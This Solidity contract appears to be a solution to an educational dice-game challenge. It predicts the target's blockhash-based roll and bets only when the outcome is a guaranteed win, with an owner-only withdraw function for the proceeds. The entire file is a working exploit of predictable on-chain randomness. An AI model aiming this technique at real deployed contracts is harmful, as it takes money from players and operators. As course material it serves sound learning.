pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    /////////////////
    /// Errors //////
    /////////////////

    error NotEnoughETH(uint256 required, uint256 available);
    error NotWinningRoll(uint256 roll);
    error InsufficientBalance(uint256 requested, uint256 available);

    //////////////////////
    /// State Variables //
    //////////////////////

    DiceGame public diceGame;

    ///////////////////
    /// Constructor ///
    ///////////////////

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    ///////////////////
    /// Functions /////
    ///////////////////

    /// @notice allow this contract to receive ETH (fund from faucet)
    receive() external payable {}

    /// @notice (optional) view helper for debugging
    function predictRoll() public view returns (uint256 roll, uint256 nonce, bytes32 prevHash) {
        prevHash = blockhash(block.number - 1);
        nonce = diceGame.nonce();

        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        roll = uint256(hash) % 16;
    }

    /// @notice only roll when guaranteed to win (roll 0~5)
    function riggedRoll() external {
        uint256 required = 0.002 ether;

        if (address(this).balance < required) {
            revert NotEnoughETH(required, address(this).balance);
        }

        (uint256 roll, uint256 nonce, bytes32 prevHash) = predictRoll();

        // debug logs (show up in hardhat node terminal)
        console.log("\t", "Rigged prevHash:", uint256(prevHash));
        console.log("\t", "Rigged diceGame:", address(diceGame));
        console.log("\t", "Rigged nonce   :", nonce);
        console.log("\t", "Rigged roll    :", roll);

        if (roll > 5) {
            revert NotWinningRoll(roll);
        }

        diceGame.rollTheDice{value: required}();
    }

    /// @notice withdraw winnings from this contract to an address (only owner)
    function withdraw(address _addr, uint256 _amount) external onlyOwner {
        if (address(this).balance < _amount) {
            revert InsufficientBalance(_amount, address(this).balance);
        }

        (bool ok, ) = payable(_addr).call{value: _amount}("");
        require(ok, "withdraw failed");
    }
}
